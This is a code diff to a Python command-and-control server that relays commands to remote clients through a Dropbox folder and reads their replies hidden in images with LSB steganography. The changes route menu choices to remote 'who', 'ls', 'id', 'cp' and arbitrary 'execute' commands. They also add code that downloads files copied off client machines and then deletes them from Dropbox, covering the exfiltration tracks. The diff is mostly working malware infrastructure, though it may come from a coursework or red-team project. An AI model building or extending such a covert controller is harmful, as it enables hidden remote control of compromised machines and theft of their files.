@@ -67,24 +67,30 @@ def handle_client_selection(clients):
 
     return -2    
 
-def handle_command_selection(clients):
+def handle_command_selection(dbx, clients, selected_client):
     print_prompt()
     i, o, e = select.select([sys.stdin], [], [], 15) #timeout after 15 seconds
+
+    commands = ['who', 'ls', 'id', 'cp', 'execute']
     if i:
         input_string = sys.stdin.readline()
         words = input_string.strip().split()
-        if len(words) > 2 or len(words) < 1 or words[0] not in ['1','2','3','4', '5', '6', '7']:
-            print("Error - Invalid Command")
+        if selected_client == -1 and words[0] not in ['6', '7']:
+            print("Error - Select a client first")
+        elif len(words) > 2 or len(words) < 1 or words[0] not in ['1','2','3','4', '5', '6', '7']:
+            print("Error - Invalid command")
         elif words[0] in ['2','4', '5'] and len(words) != 2:
-            print("Error - Invalid Command Missing Argument")
+            print("Error - Invalid command missing argument")
         elif len(words) == 2 and words[0] not in ['2','4','5','6']:
-            print("Error - Invalid Command")
+            print("Error - Invalid command")
         elif words[0] == '6':
             return handle_client_selection(clients)
         elif words[0] == '7':
             return -1
-        else:
-            print("Executing " + input_string)
+        elif words[0] in ['2','4', '5']:
+            execute_command(dbx, commands[int(words[0]) - 1] + ' ' + words[1], list(clients)[selected_client])
+        else: 
+            execute_command(dbx, commands[int(words[0]) - 1], list(clients)[selected_client])
         print("")
     else:
         print("Timing out input to perform logic, wait for prompt...")
@@ -106,7 +112,7 @@ def send_heartbeat(dbx, clients):
 
 def execute_command(dbx, command, client):
     header = current_datetime() + "|REQUEST|" + command + "|;"
-    print(header)
+    print('Executing ', header)
      
     for entry in dbx.files_list_folder('/art').entries:
         if entry.name == client:
@@ -130,8 +136,6 @@ def process_files(dbx, last_check, clients):
 
         message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())
 
-        print('Split')
-        print(message.split(';'))
         for line in message.split(';')[:-1]:
             fields = line.split('|')
             #print(fields)
@@ -142,8 +146,13 @@ def process_files(dbx, last_check, clients):
                 if fields[2] == 'heartbeat' or fields[2] == 'register':
                     print("Heartbeat detected")
                     clients[entry.name] = response_time
+                elif fields[2].split(' ')[0] == 'cp':
+                    print(fields[3])
+                    file_name = fields[3].split('\n')[1]
+                    if file_name != 'cp error - no such file':
+                        dbx.files_download_to_file(backup_path + file_name, '/art/' + file_name)
+                        dbx.files_delete('/art/' + file_name)
                 else:
-                    print("Content ")
                     print(fields[3])
 
 
@@ -184,8 +193,8 @@ if __name__ == "__main__":
             print(k)
         print("")
 
-        last_heartbeat = datetime.now() - timedelta(hours=0, minutes=10)
-        last_check = datetime.now() - timedelta(hours=0, minutes=10)
+        last_heartbeat = datetime.now()
+        last_check = datetime.now()
 
         selected_client = -1
 
@@ -202,6 +211,7 @@ if __name__ == "__main__":
                     client_diff = datetime.now() - clients[client]
                     if client_diff.seconds > TIMEOUT:
                         clients.pop(client, None)
+                        selected_client = -1
             
             heartbeat_diff = datetime.now() - last_heartbeat
             if heartbeat_diff.seconds > HEARTBEAT_PERIOD:
@@ -210,7 +220,7 @@ if __name__ == "__main__":
                 last_heartbeat = tmp
 
             # read command
-            res = handle_command_selection(clients) 
+            res = handle_command_selection(dbx, clients, selected_client) 
             if res == -1:
                 break
             elif res >= 0:
